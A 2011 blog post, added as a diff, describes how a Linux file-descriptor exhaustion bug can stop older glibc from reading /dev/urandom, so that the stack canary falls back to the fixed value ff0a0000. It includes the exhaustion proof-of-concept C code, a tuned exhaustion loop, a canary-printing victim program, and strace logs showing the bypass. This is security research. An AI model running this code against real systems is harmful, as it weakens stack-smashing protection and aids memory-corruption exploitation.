@@ -1,0 +1,518 @@
+---
+layout: post
+title: Taking advantage of File Descriptor exhaustion bugs
+date: 2011-01-20 07:24:34.000000000 +00:00
+type: post
+published: true
+status: publish
+categories:
+- Articles
+tags:
+- Bugs
+- exhaustion
+- file descriptor
+- linux
+- Security
+meta:
+  _edit_last: '2833780'
+---
+<p>Recently I saw an email at Full Disclosure (<a href="http://seclists.org/fulldisclosure/2010/Nov/303">here</a> &amp; <a href="http://marc.info/?l=linux-kernel&amp;m=129055087923940&amp;w=2">here</a>?), which provides a typical File Descriptor exhaustion bug and I decided to use it as a demonstration bug for this post. There are situations in which a File Descriptor exhaustion issue can help when trying to take advantage of certain conditions (in many cases local). In most of these cases exploitation will involve some kind of race condition.</p>
+<p>
+The example described bellow aims in disabling a Linux security countermeasure and possibly of other OSs which implement the same type of protection in a similar way. Note that below I am demonstrating this issue in older kernel/libc versions due to changes in the way that this protection is implemented in newer versions which protects against this.</p>
+<p>Environment:<br />
+<code>manos@jaunty:~/p/ke$ uname -a<br />
+Linux jaunty 2.6.28-11-generic #42-Ubuntu SMP Fri Apr 17 01:57:59 UTC 2009 i686 GNU/Linux<br />
+</code><br />
+<code>manos@jaunty:~/p/ke$ sudo aptitude show libc6<br />
+Package: libc6<br />
+State: installed<br />
+Automatically installed: no<br />
+Version: 2.9-4ubuntu6.3<br />
+Priority: required<br />
+Section: libs<br />
+Maintainer: Ubuntu Core developers<br />
+Uncompressed Size: 11.2M<br />
+Depends: libgcc1, findutils (&gt;= 4.4.0-2ubuntu2)<br />
+Suggests: locales, glibc-doc, libc6-i686<br />
+Conflicts: libterm-readline-gnu-perl (&lt; 1.15-2), tzdata (&lt; 2007k-1),<br />
+           tzdata-etch, nscd (&lt; 2.9)<br />
+Replaces: belocs-locales-bin<br />
+Provides: glibc-2.9-1<br />
+Description: GNU C Library: Shared libraries<br />
+ Contains the standard libraries that are used by nearly all programs on the<br />
+ system. This package includes shared versions of the standard C library and the<br />
+ standard math library, as well as many others.<br />
+</code>*This glibc version was purposely picked.</p>
+<p><code>manos@jaunty:~/p/ke$ gcc -v<br />
+..<br />
+gcc version 4.3.3 (Ubuntu 4.3.3-5ubuntu4) </code></p>
+<p>First lets print out the posted poc code:<br />
+
+{% highlight c %}
+
+#include <sys/socket.h>
+#include <sys/un.h>
+ 
+static int send_fd (int unix_fd, int fd)
+{
+struct msghdr msgh;
+struct cmsghdr *cmsg;
+char buf[CMSG_SPACE (sizeof (fd))];
+memset (&msgh, 0, sizeof (msgh));
+ 
+ 
+memset (buf, 0, sizeof (buf));
+ 
+msgh.msg_control = buf;
+msgh.msg_controllen = sizeof (buf);
+ 
+cmsg = CMSG_FIRSTHDR (&msgh);
+cmsg->cmsg_len = CMSG_LEN (sizeof (fd));
+cmsg->cmsg_level = SOL_SOCKET;
+ 
+ 
+cmsg->cmsg_type = SCM_RIGHTS;
+ 
+msgh.msg_controllen = cmsg->cmsg_len;
+ 
+memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
+return sendmsg (unix_fd, &msgh, 0);
+}
+ 
+int main ()
+{
+ 
+int fd[2], ff[2];
+ 
+int target;
+if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)==-1)
+return 1;
+for (;;)
+{
+if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)==-1)
+return 2;
+send_fd (ff[0], fd[0]);
+send_fd (ff[0], fd[1]);
+ 
+ 
+close (fd[1]);
+close (fd[0]);
+fd[0] = ff[0];
+fd[1] = ff[1];
+}
+}
+
+{% endhighlight %}
+
+
+<br />
+Check <a href="http://linux.die.net/man/2/socketpair">here</a> and <a href="http://marc.info/?l=linux-netdev&amp;m=129055394027555&amp;w=2">here</a> if you want to know what is happening.</p>
+<p>Next, we are moving to the targeted protection:</p>
+<p>file: glibc-2.9/sysdeps/unix/sysv/linux/dl-osinfo.h<br />
+
+{% highlight c %}
+
+..
+static inline uintptr_t __attribute__ ((always_inline))
+_dl_setup_stack_chk_guard (void)
+{
+uintptr_t ret;
+#ifdef ENABLE_STACKGUARD_RANDOMIZE
+int fd = __open ("/dev/urandom", O_RDONLY);
+if (fd >= 0)
+{
+ssize_t reslen = __read (fd, &ret, sizeof (ret));
+__close (fd);
+if (reslen == (ssize_t) sizeof (ret))
+return ret;
+}
+#endif
+ret = 0;
+unsigned char *p = (unsigned char *) &ret;
+p[sizeof (ret) - 1] = 255;
+p[sizeof (ret) - 2] = '\n';
+return ret;
+}
+..
+
+{% endhighlight %}
+
+
+
+
+<p>It is pretty obvious what our target is. Just in case you didn't see it, we want to use our file exhaustion bug and disable the ENABLE_STACKGUARD_RANDOMIZE part of the code and leave only the terminator value (aka ff0a0000) which in certain situations can be overwritten and secure us EIP control.</p>
+<p>we want this unreachable :<br />
+
+{% highlight c %}
+
+if (fd >= 0)
+{
+ssize_t reslen = __read (fd, &ret, sizeof (ret));
+__close (fd);
+if (reslen == (ssize_t) sizeof (ret))
+return ret;
+}
+
+{% endhighlight %}
+
+<p>
+We want fd to return something less than 0. To increase our chances of doing this we are going to modify a little bit our FD exhaustion code : </p>
+
+{% highlight c %}
+
+#include <sys/socket.h>
+#include <sys/un.h>         
+#include <stdio.h> 
+#include <string.h>
+#include <stddef.h>   
+       
+//return file-nr array - exit's when there are not enough File Descriptors     
+int* nr()
+{
+    char line [100]; 
+    FILE *filenr;
+    if((filenr = fopen("/proc/sys/fs/file-nr", "r")) == NULL){printf("\nOvershoot FDs - exiting\n");exit(0);}   
+    fgets ( line, sizeof line, filenr );                                 
+    fclose(filenr); 
+    int out[3];
+    sscanf(line, "%d %d %d", &out[0],&out[1],&out[2]);  
+return out;
+}   
+ 
+static int send_fd (int unix_fd, int fd)
+{
+      struct msghdr msgh;
+      struct cmsghdr *cmsg;
+      char buf[CMSG_SPACE (sizeof (fd))];
+      memset (&msgh, 0, sizeof (msgh));
+      memset (buf, 0, sizeof (buf));
+      msgh.msg_control = buf;
+      msgh.msg_controllen = sizeof (buf);
+      cmsg = CMSG_FIRSTHDR (&msgh);
+      cmsg->cmsg_len = CMSG_LEN (sizeof (fd));
+      cmsg->cmsg_level = SOL_SOCKET;
+      cmsg->cmsg_type = SCM_RIGHTS;
+      msgh.msg_controllen = cmsg->cmsg_len;
+      memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
+      return sendmsg (unix_fd, &msgh, 0);   
+}    
+ 
+ 
+ 
+int crash_loop(int loop) 
+{
+     
+ int fd[3], ff[3];
+ int count=0;
+ 
+  while (count<loop)                         
+  {  
+     
+    //Set FD lower limit for shooting out Canary          
+    int *in = nr();
+    int c=in[0],i=in[1],l=in[2]; 
+ 
+        if (l-c<=80) 
+        {
+        system("strace -x -e trace=read,open ./m"); 
+        }              
+             
+    if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)==-1)
+    return 2;   
+    send_fd (ff[0], fd[0]);
+    send_fd (ff[0], fd[1]);
+    close (fd[1]);
+    close (fd[0]);
+    fd[0] = ff[0];
+    fd[1] = ff[1];                        
+    count++;
+  } 
+}
+ 
+int main (int argc, char *argv[])
+{    
+    printf ("Start Exhaustion Loop\n");  
+ 
+    while (1)
+        {  
+            crash_loop(1);
+            }
+}
+
+{% endhighlight %}
+
+<p>
+What we added is some control over the loop and nr() which probes /proc/sys/fs/file-nr and gets the current used FDs and the system's FD limit. Then we take this array and we set the lower limit of free file descriptors before attempting to "lock" access to /dev/urandom. Note that since this process is going to be un-killable we want it to stop at the point where we have no other free descriptors, hence we "exit" when we can't open /proc/sys/fs/file-nr.  We execute our victim application using strace, as we want to see all the system calls (e.g. open, read). *Note that the use of usleep might come handy if we want to stabilise our free FDs to a certain number, since the method described below is likely to be used in a waiting stabilising process form rather than executing multiple times our target program as described here.</p>
+<p>Now let's look our victim application :<br />
+{% highlight c %}
+
+#include <stdint.h>
+#include <stdio.h>
+ 
+ 
+int main(int argc, char *argv[]) 
+ 
+    {   //STACK_CHK_GUARD  -  i386    (stackguard-macros.h)    
+        uintptr_t x; 
+        asm ("movl %%gs:0x14, %0" : "=r" (x));
+        fprintf(stderr, "Cookie [%%gs:0x14=%0lx]\n\n",x)    ; 
+    }
+
+
+{% endhighlight %}
+
+<br />
+We simply take the canary from %gs:0x14 and we print it out. If we execute it with strace we get the following : </p>
+<p><code>
+brk(0)                                  = 0x8b3e000<br />
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)<br />
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb8000000<br />
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)<br />
+open("/etc/ld.so.cache", O_RDONLY)      = 3<br />
+fstat64(3, {st_mode=S_IFREG|0644, st_size=50808, ...}) = 0<br />
+mmap2(NULL, 50808, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ff3000<br />
+close(3)                                = 0<br />
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)<br />
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3<br />
+read(3, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\.."..., 512) = 512<br />
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1442180, ...}) = 0<br />
+mmap2(NULL, 1451632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e90000<br />
+mprotect(0xb7fec000, 4096, PROT_NONE)   = 0<br />
+mmap2(0xb7fed000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15c) = 0xb7fed000<br />
+mmap2(0xb7ff0000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ff0000<br />
+close(3)                                = 0<br />
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e8f000<br />
+set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb7e8f6c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0<br />
+open("/dev/urandom", O_RDONLY)          = 3<br />
+read(3, "\xc9\x6e\xa8"..., 3)           = 3<br />
+close(3)                                = 0<br />
+mprotect(0xb7fed000, 8192, PROT_READ)   = 0<br />
+mprotect(0x8049000, 4096, PROT_READ)    = 0<br />
+mprotect(0xb801f000, 4096, PROT_READ)   = 0<br />
+munmap(0xb7ff3000, 50808)               = 0<br />
+write(2, "Cookie [%gs:0x14=a86ec900]\n\n"..., 28Cookie [%gs:0x14=a86ec900]) = 28<br />
+exit_group(28)                         = ?</code></p>
+<p>We can clearly see that : </p>
+<p><code>open("/dev/urandom", O_RDONLY)          = 3<br />
+read(3, "\xc9\x6e\xa8"..., 3)           = 3</code></p>
+<p>and our canary is a86ec900 (little endian + 1 null byte)</p>
+<p>Now that we have everything set let's see what happens when we execute our code: </p>
+<p><code>manos@jaunty:~/p/ke$./pp&amp;<br />
+Start Exhaustion Loop<br />
+.<br />
+.<br />
+.<br />
+open("/etc/ld.so.cache", O_RDONLY)      = 3<br />
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3<br />
+read(3, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00....., 512) = 512<br />
+open("/dev/urandom", O_RDONLY)          = 3<br />
+read(3, "\x04\xe8\x8e"..., 3)           = 3<br />
+Cookie [%gs:0x14=8ee80400]<br />
+open("/etc/ld.so.cache", O_RDONLY)      = 0<br />
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 0<br />
+read(0, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x0.."..., 512) = 512<br />
+open("/dev/urandom", O_RDONLY)          = 0<br />
+read(0, "ATX"..., 3)                    = 3<br />
+Cookie [%gs:0x14=58544100]<br />
+open("/etc/ld.so.cache", O_RDONLY)      = 3<br />
+open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3<br />
+read(3, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03.."..., 512) = 512<br />
+<strong>open("/dev/urandom", O_RDONLY)          = -1 ENFILE (Too many open files in system)<br />
+Cookie [%gs:0x14=a967000]</strong></code><br />
+<code>Overshoot FDs - exiting</code></p>
+<p>As we can see, after some executions we managed to block ENABLE_STACKGUARD_RANDOMIZE with an ENFILE error and jump straight after the if statement. Clearly we should have seen ff0a0000 here. After some more tries we observe the following canary values (for fd =-1) : </p>
+<p><code>..<br />
+0xe8537000<br />
+0x1c0d7000<br />
+0x146c7000<br />
+0xe8b0f000<br />
+0x1d487000<br />
+0x13d2f000<br />
+0x15caf000<br />
+ 0x7c3f000<br />
+0xe1b47000<br />
+ 0x6e77000<br />
+0xe5a47000<br />
+0x1ab7f000<br />
+0xf4237000<br />
+0x1978f000<br />
+0xe584f000<br />
+ 0x5287000<br />
+0x18de7000<br />
+ 0xb517000<br />
+0x1311f000<br />
+0xf1f47000<br />
+ 0x310f000<br />
+0xfe0b7000<br />
+0xf7ccf000<br />
+0xff2ff000<br />
+0xf8d07000<br />
+ 0x6e77000<br />
+0xf35ef000<br />
+0xf0f07000<br />
+0xe21af000<br />
+0xf1b57000<br />
+0xb71f000<br />
+0x1c0d7000<br />
+<strong>0xe9f5f000<br />
+0xe832f000<br />
+0xe8f1f000<br />
+0xed26f000<br />
+0xee4b7000</strong><br />
+0x83cf000<br />
+0xeb1e7000<br />
+0xc0c7000<br />
+0xf9f4f000<br />
+..</code></p>
+<p>Some modification is happening on the terminator canary.</p>
+<p>If we get libc6 along with glibc_2.9-4ubuntu6.3.diff and inspect the patch, we see the following lines added within dl-osinfo.h : </p>
+<p>
+
+{% highlight c %}
+
++@@ -77,5 +80,31 @@
++   unsigned char *p = (unsigned char *) &ret;
++   p[sizeof (ret) - 1] = 255;
++   p[sizeof (ret) - 2] = '\n';
+++#ifdef HP_TIMING_NOW
+++  hp_timing_t hpt;
+++  HP_TIMING_NOW (hpt);
+++  hpt = (hpt & 0xffff) << 8;
+++  ret ^= hpt;
+++#endif
+++  uintptr_t stk;
+++  /* Avoid GCC being too smart.  */
+++  asm ("" : "=r" (stk) : "r" (p));
+++  stk &= 0x7ffff0;
+++#if __BYTE_ORDER == __LITTLE_ENDIAN
+++  stk <<= (__WORDSIZE - 23);
+++#elif __WORDSIZE == 64
+++  stk <<= 31;
+++#endif
+++  ret ^= stk;
+++  /* Avoid GCC being too smart.  */
+++  p = (unsigned char *) &errno;
+++  asm ("" : "=r" (stk) : "r" (p));
+++  stk &= 0x7fff00;
+++#if __BYTE_ORDER == __LITTLE_ENDIAN
+++  stk <<= (__WORDSIZE - 29);
+++#else
+++  stk >>= 8;
+++#endif
+++  ret ^= stk;
++   return ret; ;      
+
+
+{% endhighlight %}
+
+<p>This patch is XORing the value of ret (terminator value) with the current CPU tick counter (taken from rdtsc). Then the array's (p) address is used (as additional entropy) and the rest can be replicated by us, so the patch adds some fair and cheap trickery (<a href="http://www.mail-archive.com/debian-glibc@lists.debian.org/msg42655.html">poor man's randomisation</a>) - *while I was writing this post, <a href="http://vexillium.org/dl.php?/Windows_Kernel-mode_GS_Cookies_subverted.pdf">this</a> was published, which shows that windows kernel mode canary generation is similar to the above.<br /></p>
+<p>To make sure that a glibc version without the stack-guard-quick-randomization.diff applied is giving ff0a0000 (even though we can confirm this with strace), we recompile glibc without this patch. This will save us some time of looking around to find a distro without this patch applied (we just comment out all XOR operations).</p>
+<p>So lets run pp again :<br />
+<code>manos@jaunty:~/p/ke$./pp&amp;<br />
+Start Exhaustion Loop<br />
+.<br />
+.<br />
+.<br />
+[b80a70d4] open("/etc/ld.so.cache", O_RDONLY) = 0<br />
+[b80a70d4] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 0<br />
+[b80a7154] read(0, "\x7f\x45\x4c\x46\x01\x01\x01\x00.."..., 512) = 512<br />
+[b80a70d4] open("/dev/urandom", O_RDONLY) = 0<br />
+[b80a7154] read(0, "\x17\x7f\x77"..., 3) = 3<br />
+Cookie [%gs:0x14=777f1700]<br />
+[b7f7e0d4] open("/etc/ld.so.cache", O_RDONLY) = 3<br />
+[b7f7e0d4] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3<br />
+[b7f7e154] read(3, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\..."..., 512) = 512<br />
+[b7f7e0d4] open("/dev/urandom", O_RDONLY) = 3<br />
+[b7f7e154] read(3, "\x70\xec\x1e"..., 3) = 3<br />
+Cookie [%gs:0x14=1eec7000]<br />
+[b80f10d4] open("/etc/ld.so.cache", O_RDONLY) = 0<br />
+[b80f10d4] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 0<br />
+[b80f1154] read(0, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00..."..., 512) = 512<br />
+[b80f10d4] open("/dev/urandom", O_RDONLY) = 0<br />
+[b80f1154] read(0, "\x64\x95\xb7"..., 3) = 3<br />
+Cookie [%gs:0x14=b7956400]<br />
+[b808a0d4] open("/etc/ld.so.cache", O_RDONLY) = 3<br />
+[b808a0d4] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3<br />
+[b808a154] read(3, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00..."..., 512) = 512<br />
+[b808a0d4] open("/dev/urandom", O_RDONLY) = -1 ENFILE (Too many open files in system)<br />
+<strong>Cookie [%gs:0x14=ff0a0000]</strong></code><br />
+<code>Overshoot FDs - exiting<br />
+</code><br />
+<strong>We are now certain that a simple File Descriptor exhaustion bug can assist in disabling canary stack randomisation.</strong> It is worth mentioning that /dev/urandom was dropped mainly on performance and not security implications of FD hijacking or shortage. </p>
+<p>As this post is focused on disabling the ENABLE_STACKGUARD_RANDOMIZE we are not going to analyse ways of guessing/determing  stack-guard-quick-randomization.diff entropy points, however going back to the patched version and based solely on visual canary value observations, we can see that we significantly reduced the canary space from 16777215  to almost 65535. <strong>rdtsc</strong> can be predicted with some decent accuracy in a low/medium usage uniprocessor systems, during non-context switched execution, but we save this for another time.</p>
+<p>
+Below is a simple patch for strace - which prints rdtsc at each "syscal exit" (trace_syscall_exiting) - <em>It is not accurate but it can be used for roughly observing tick jumps</em></p>
+
+{% highlight c %}
+
+--- syscall.c
++++ syscall.c
+@@ -109,7 +109,7 @@
+ #define TN TRACE_NETWORK
+ #define TP TRACE_PROCESS
+ #define TS TRACE_SIGNAL
+-
++#define HP_TIMING_NOW(Var) __asm__ __volatile__ ("rdtsc" : "=A" (Var))
+ static const struct sysent sysent0[] = {
+ #include "syscallent.h"
+ };
+@@ -2520,7 +2520,8 @@
+            (long) tv.tv_sec, (long) tv.tv_usec);
+    }
+    printtrailer();
+-
++   HP_TIMING_NOW (hpt);
++   tprintf(" rdtsc : %lld   ",hpt );
+    dumpio(tcp);
+    if (fflush(tcp->outf) == EOF)
+        return -1;
+
+{% endhighlight %}
+
+</p>
+<p>The output of strace with the rdtsc out is :<br />
+<code>execve("./m", ["./m"], [/* 20 vars */]) = 0<br />
+		 rdtsc : 170812617327520   brk(0)                                  = 0x9a62000<br />
+		 rdtsc : 170812617944640   access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)<br />
+		 rdtsc : 170812618580380   mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb8083000<br />
+		 rdtsc : 170812618926180   access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)<br />
+		 rdtsc : 170812619351780   open("/etc/ld.so.cache", O_RDONLY)      = 3<br />
+		 rdtsc : 170812619758760   fstat64(3, {st_mode=S_IFREG|0644, st_size=50808, ...}) = 0<br />
+		 rdtsc : 170812620131160   mmap2(NULL, 50808, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb8076000<br />
+		 rdtsc : 170812620421100   close(3)                                = 0<br />
+		 rdtsc : 170812620785520   access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)<br />
+		 rdtsc : 170812621126000   open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3<br />
+		 rdtsc : 170812621530320   read(3, "\177ELF\1\1\1\3\3\1\320h\1004"..., 512) = 512<br />
+		 rdtsc : 170812621830900   fstat64(3, {st_mode=S_IFREG|0755, st_size=1442180, ...}) = 0<br />
+		 rdtsc : 170812622221920   mmap2(NULL, 1451632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7f13000<br />
+		 rdtsc : 170812622559740   mprotect(0xb806f000, 4096, PROT_NONE)   = 0<br />
+		 rdtsc : 170812622852340   mmap2(0xb8070000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x15c) = 0xb8070000<br />
+		 rdtsc : 170812623144940   mmap2(0xb8073000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb8073000<br />
+		 rdtsc : 170812623490740   close(3)                                = 0<br />
+		 rdtsc : 170812623831220   mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f12000<br />
+		 rdtsc : 170812624230220   set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb7f126c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0<br />
+		 rdtsc : 170812624568040   open("/dev/urandom", O_RDONLY)          = 3<br />
+		 rdtsc : 170812624900540   read(3, "\247\33'", 3)                  = 3<br />
+		 rdtsc : 170812625185160   close(3)                                = 0<br />
+		 rdtsc : 170812625453820   mprotect(0xb8070000, 8192, PROT_READ)   = 0<br />
+		 rdtsc : 170812626110840   mprotect(0x8049000, 4096, PROT_READ)    = 0<br />
+		 rdtsc : 170812626430040   mprotect(0xb80a2000, 4096, PROT_READ)   = 0<br />
+		 rdtsc : 170812626757220   munmap(0xb8076000, 50808)               = 0<br />
+		 rdtsc : 170812627081740   write(2, "\nUSAGE: 1 (print Canary), 2 (ter"..., 52<br />
+		USAGE: 1 (print Canary), 2 (terminator owerwrite)) = 52<br />
+		 rdtsc : 170812627674920   exit_group(52)                          = ?<br />
+</code></p>
+<p><font color="green">For other possible FD exhaustion targets you can look <a href="http://www.google.com/codesearch?hl=en&amp;lr=&amp;q=lang%3AC+if%5C%28fd%3E%3D0&amp;sbtn=Search">here</a></font>.</p>
+<p>
+I didn't explain some things since they have been discussed before, so if you have unanswered questions have a look below  :</p>
+<li><a href="http://www.trl.ibm.com/projects/security/ssp/">http://www.trl.ibm.com/projects/security/ssp/</a></li>
+<li><a href="http://www.phrack.org/issues.html?issue=67&amp;id=13">http://www.phrack.org/issues.html?issue=67&amp;id=13 </a></li>
+<li><a href="http://sources.redhat.com/ml/libc-alpha/2008-10/msg00016.html">http://sources.redhat.com/ml/libc-alpha/2008-10/msg00016.html</a></li>
+<li><a href="http://cwe.mitre.org/data/definitions/769.html">http://cwe.mitre.org/data/definitions/769.html</a></li>
+<li><a href="http://en.wikipedia.org/wiki/Time_Stamp_Counter">http://en.wikipedia.org/wiki/Time_Stamp_Counter</a></li>
+<li><a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=511811">http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=511811</a></li>
+<li><a href="https://bugs.launchpad.net/ubuntu/+source/glibc/+bug/275493">https://bugs.launchpad.net/ubuntu/+source/glibc/+bug/275493</a></li>
+<li><a href="http://sourceware.org/bugzilla/show_bug.cgi?id=10149">http://sourceware.org/bugzilla/show_bug.cgi?id=10149</a></li>
+<li><a href="http://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/">http://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/</a></li>
+<li><a href="http://census-labs.com/news/2009/01/21/static-ssp-canary-debian-libc6/">http://census-labs.com/news/2009/01/21/static-ssp-canary-debian-libc6/</a></li></p>
+<br>
